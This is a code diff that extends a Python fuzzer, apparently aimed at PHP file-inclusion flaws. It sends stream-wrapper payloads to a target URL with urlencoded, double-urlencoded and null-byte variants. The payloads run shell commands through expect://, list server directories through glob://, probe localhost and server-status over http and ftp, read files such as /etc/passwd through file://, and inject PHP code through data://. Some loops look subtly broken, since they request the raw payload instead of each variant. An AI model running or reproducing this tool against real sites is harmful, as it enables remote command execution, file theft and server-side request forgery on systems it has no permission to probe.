@@ -7,94 +7,178 @@ import urllib3
 urllib3.disable_warnings()
 
 def help():
-    pass
+    print("\t-u URL, --url=URL\tscan url")
+    print("\t-p, --path=      \tdir or file")
+    print("\t--hcode=         \tHidden code separate [,]")
+    print("\t--hsize=         \tHidden length content separate [,]")
+    print("\t--htext=         \tHidden text separate [,]")
+    print("\t-c, --cookie     \tset cookie separate [,]")
+    print("EXAMPLES: ")    
+    print("\twrappers_fuzz.py -u http://example.com -p test")
+    print("\twrappers_fuzz.py --url=http://example.com --path=test")
+    print("\twrappers_fuzz.py --url=http://example.com --path=test --hcode=404,502")
+    print("\twrappers_fuzz.py --url=http://example.com --path=test --hsize=612")
+    print("\twrappers_fuzz.py-u http://example.com -p test --cookie session=test,path=/")
 
 
-def wrapper_expect_fuzz(url, hcode=(), hsize=(), cookie=None, redirect=False):
+def wrapper_expect_fuzz(url, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
     cmds = ["ls", "pwd", "id", "whoami", "cd"]
+    
     for cmd in cmds:
-        resp = requests.get(f"{url}expect://{cmd}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-        print(common.good_code(resp.status_code, f"expect://{cmd} [code:{resp.status_code} size:{len(resp.content)}]"))
-        resp = requests.get(f"{url}expect://{cmd}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-        print(common.good_code(resp.status_code, f"expect://{cmd}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+        expect_payloads = [f"expect://{cmd}", f"expect://{cmd}%00"]
+        for payload in expect_payloads:
+            resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
+            # urlencode
+            resp = requests.get(f"{url}{common.urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}{common.urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+            # double urlencode
+            resp = requests.get(f"{url}{common.double_urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}{common.double_urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
 
    
-def wrapper_glob_fuzz(url, hcode=(), hsize=(), cookie=None, redirect=False):
+def wrapper_glob_fuzz(url, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
     dirs = ["/etc/", "/tmp/", "/var/www/html/"]
-    resp = requests.get(f"{url}glob://*.*", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-    print(common.good_code(resp.status_code, f"glob://*.* [code:{resp.status_code} size:{len(resp.content)}]"))
-    resp = requests.get(f"{url}glob://*.*%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-    print(common.good_code(resp.status_code, f"glob://*.*%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+
     for d in dirs:
-        resp = requests.get(f"{url}glob://{d}*", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-        print(common.good_code(resp.status_code, f"glob://{d}* [code:{resp.status_code} size:{len(resp.content)}]"))
-        resp = requests.get(f"{url}glob://{d}*%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-        print(common.good_code(resp.status_code, f"glob://{d}*%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-        resp = requests.get(f"{url}glob://{d}*.*", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-        print(common.good_code(resp.status_code, f"glob://{d}*.* [code:{resp.status_code} size:{len(resp.content)}]"))
-        resp = requests.get(f"{url}glob://{d}*.*%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-        print(common.good_code(resp.status_code, f"glob://{d}*.*%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+        glob_paloads = [f"glob://*.*", f"glob://{d}*", f"glob://{d}*.*", f"glob://*.*", f"glob://{d}*%00", f"glob://{d}*.*%00"]
+        for payload in glob_paloads:
+            resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
+            # urlencode
+            resp = requests.get(f"{url}{common.urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}{common.urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+            # double urlencode
+            resp = requests.get(f"{url}{common.double_urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}{common.double_urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
         
 
         
-def wrapper_http_fuzz(url, hcode=(), hsize=(), cookie=None, redirect=False):
-    schemes = ["http", "https"]
-    resp = requests.get(f"{url}{url}/server-status", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-    print(common.good_code(resp.status_code, f"{url}{url}/server-status [code:{resp.status_code} size:{len(resp.content)}]"))
-    resp = requests.get(f"{url}{url}/", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect)
-    print(common.good_code(resp.status_code, f"{url}{url}/ [code:{resp.status_code} size:{len(resp.content)}]"))
-    resp = requests.get(f"{url}{url}/server-status%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-    print(common.good_code(resp.status_code, f"{url}{url}/server-status%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-    resp = requests.get(f"{url}{url}/%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-    print(common.good_code(resp.status_code, f"{url}{url}/%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-    
-    for scheme in schemes:        
-        for addr in common.ADDR_LOCALHOST:
-            resp = requests.get(f"{url}{scheme}://{addr}/", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-            print(common.good_code(resp.status_code, f"{url}{scheme}://{addr}/ [code:{resp.status_code} size:{len(resp.content)}]"))
-            resp = requests.get(f"{url}{scheme}://{addr}/%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-            print(common.good_code(resp.status_code, f"{url}{scheme}://{addr}/%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-            resp = requests.get(f"{url}{scheme}://{addr}/server-status", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-            print(common.good_code(resp.status_code, f"{url}{scheme}://{addr}/server-status [code:{resp.status_code} size:{len(resp.content)}]"))
-            resp = requests.get(f"{url}{scheme}://{addr}/server-status%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-            print(common.good_code(resp.status_code, f"{url}{scheme}://{addr}/server-status%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-
-
-def wrapper_ftp_fuzz(url, hcode=(), hsize=(), cookie=None, redirect=False):
+def wrapper_http_fuzz(url, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
+    schemes = ["http", "https"]    
     for addr in common.ADDR_LOCALHOST:
-        resp = requests.get(f"{url}ftp://{addr}/", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-        print(common.good_code(resp.status_code, f"{url}ftp://{addr}/ [code:{resp.status_code} size:{len(resp.content)}]"))
-        resp = requests.get(f"{url}ftp://{addr}/%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-        print(common.good_code(resp.status_code, f"{url}ftp://{addr}/%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-        resp = requests.get(f"{url}ftp://{addr}/pub", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-        print(common.good_code(resp.status_code, f"{url}ftp://{addr}/pub [code:{resp.status_code} size:{len(resp.content)}]"))
-        resp = requests.get(f"{url}ftp://{addr}/pub%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-        print(common.good_code(resp.status_code, f"{url}ftp://{addr}/pub%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+        for scheme in schemes:
+            http_payloads = [f"{scheme}://{addr}/", f"{scheme}://{addr}/server-status", f"{scheme}://{addr}/%00", f"{scheme}://{addr}/server-status%00"]
+            for payload in http_payloads:
+                resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                    print(common.good_code(resp.status_code, f"{url}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
+                # urlencode
+                resp = requests.get(f"{url}{common.urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                    print(common.good_code(resp.status_code, f"{common.urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}{common.urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                    print(common.good_code(resp.status_code, f"{common.urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                # double urlencode
+                resp = requests.get(f"{url}{common.double_urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                    print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}{common.double_urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                    print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+
+
+
+def wrapper_ftp_fuzz(url, hcode=(), hsize=(), htext=(), cookie=None, redirect=False): 
+    for addr in common.ADDR_LOCALHOST:
+        ftp_payloads = [f"ftp://{addr}/", f"ftp://{addr}/pub", f"ftp://{addr}/%00", f"ftp://{addr}/pub%00"]
+        for payload in ftp_payloads:
+            resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
+            # urlencode
+            resp = requests.get(f"{url}{common.urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}{common.urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+            # double urlencode
+            resp = requests.get(f"{url}{common.double_urlencode(payload)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)} [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}{common.double_urlencode(payload)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+                print(common.good_code(resp.status_code, f"{common.double_urlencode(payload)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+       
     
     
-def wrapper_file_fuzz(url, payload, hcode=(), hsize=(), cookie=None, redirect=False):
-    resp = requests.get(f"{url}file://{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-    print(common.good_code(resp.status_code, f"{url}file://{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
-    resp = requests.get(f"{url}file://{payload}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
-    print(common.good_code(resp.status_code, f"{url}file://{payload}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
-)
+def wrapper_file_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
+    file_payloads = [f"file://{payload}", f"file://{payload}%00"]
+    for p in file_payloads:
+        resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{url}{p} [code:{resp.status_code} size:{len(resp.content)}]"))
+        # urlencode
+        resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{url}{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+        resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{url}{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+        # double urlencode
+        resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{url}{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+        resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{url}{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+
     
-def wrapper_data_fuzz(url, payload, hcode=(), hsize=(), cookie=None, redirect=False):
-    print(f"{url}data://text/plain,<?php echo base64_encode(file_get_contents({payload})); ?>")
-    print(f"{url}data://text/plain,<?php echo base64_encode(file_get_contents({payload})); ?>%00")
-    print(f"{url}data://text/plain,<?php echo base64_encode(phpinfo()); ?>")
-    print(f"{url}data://text/plain,<?php echo base64_encode(phpinfo()); ?>%00")
-    print(f"{url}data://text/plain,<?php phpinfo(); ?>")
-    print(f"{url}data://text/plain,<?php phpinfo(); ?>%00")
+def wrapper_data_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
+    data_payloads = [f"data://text/plain,<?php echo base64_encode(file_get_contents({payload})); ?>",
+                     f"data://text/plain,<?php echo base64_encode(phpinfo()); ?>",
+                     f"data://text/plain,<?php phpinfo(); ?>",
+                     f"data://text/plain,<?php echo base64_encode(file_get_contents({payload})); ?>%00",
+                     f"data://text/plain,<?php echo base64_encode(phpinfo()); ?>%00",
+                     f"data://text/plain,<?php phpinfo(); ?>%00"]
+    for p in data_payloads:
+        resp = requests.get(f"{url}{payload}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
+        # urlencode
+        resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+        resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+        # double urlencode
+        resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+        resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=redirect, verify=False)
+        if resp.status_code not in hcode and len(resp.content) not in hsize and not common.find_content(resp.text, htext):
+            print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+
     
-def wrapper_compress_fuzz(url, payload, hcode=(), hsize=(), cookie=None, redirect=False):
+def wrapper_compress_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):
     print(f"{url}compress.zlib://{payload}")
     print(f"{url}compress.zlib://{payload}%00")    
     print(f"{url}compress.bzip2://{payload}")
     print(f"{url}compress.bzip2://{payload}%00")
     
     
-def wrapper_php_fuzz(url, payload, hcode=(), hsize=(), cookie=None, redirect=False):  
+def wrapper_php_fuzz(url, payload, hcode=(), hsize=(), htext=(), cookie=None, redirect=False):  
     for n in range(101):
         print(f"{url}php://fd/{n}")
         print(f"{url}php://fd/{n}%00")
@@ -113,8 +197,11 @@ def main():
     path = None
     cookie = None
     redirect = False
+    hcode = ()
+    hsize= ()
+    htext = ()
     try:
-        opts, args = getopt.getopt(sys.argv[1:], "u:p:c:r", ["url=", "path=", "cookie=", "redirect="])
+        opts, args = getopt.getopt(sys.argv[1:], "u:p:c:r", ["url=", "path=", "cookie=", "hcode=", "hsize=", "htext=", "redirect="])
         for opt, arg in opts:            
             if opt in ("-u", "--url"):                    
                 url = arg
@@ -124,6 +211,12 @@ def main():
                 cookie = common.parse_cookie(arg)
             elif opt in ("-r", "--redirect"):                    
                 redirect = True
+            elif opt in ("--hcode"):                    
+                hcode = tuple(map(int, arg.split(",")))
+            elif opt in ("--hsize"):                    
+                hsize = tuple(map(int, arg.split(",")))
+            elif opt in ("--htext"):                    
+                htext = tuple(map(str, arg.split(",")))
             else:
                 help()
                 sys.exit(0)
@@ -137,21 +230,33 @@ def main():
             print("\n--------------------------")
             print("[!] Wrapper expect fuzzing")
             print("--------------------------\n")
-            wrapper_expect_fuzz(url)
+            wrapper_expect_fuzz(url, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
             
             print("\n------------------------")
             print("[!] Wrapper glob fuzzing")
             print("------------------------\n")
-            wrapper_glob_fuzz(url)
+            wrapper_glob_fuzz(url, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
             
             print("\n------------------------")
             print("[!] Wrapper http fuzzing")
             print("------------------------\n")
-            wrapper_http_fuzz(url)
+            wrapper_http_fuzz(url, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
 
-            """wrapper_ftp_fuzz("http://test.ru?page=")
-            wrapper_file_fuzz("http://test.ru?page=", "/etc/passwd")
-            wrapper_compress_fuzz("http://test.ru?page=", "/etc/passwd")
+            print("\n------------------------")
+            print("[!] Wrapper ftp fuzzing")
+            print("------------------------\n")
+            wrapper_ftp_fuzz(url, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
+
+            print("\n------------------------")
+            print("[!] Wrapper file fuzzing")
+            print("------------------------\n")
+            wrapper_file_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
+
+            print("\n------------------------")
+            print("[!] Wrapper data fuzzing")
+            print("------------------------\n")
+            wrapper_data_fuzz(url, path, hcode=hcode, hsize=hsize, htext=htext, cookie=cookie, redirect=redirect)
+            """wrapper_compress_fuzz("http://test.ru?page=", "/etc/passwd")
             wrapper_php_fuzz("http://test.ru?page=", "/etc/passwd")"""
         else:
             help()
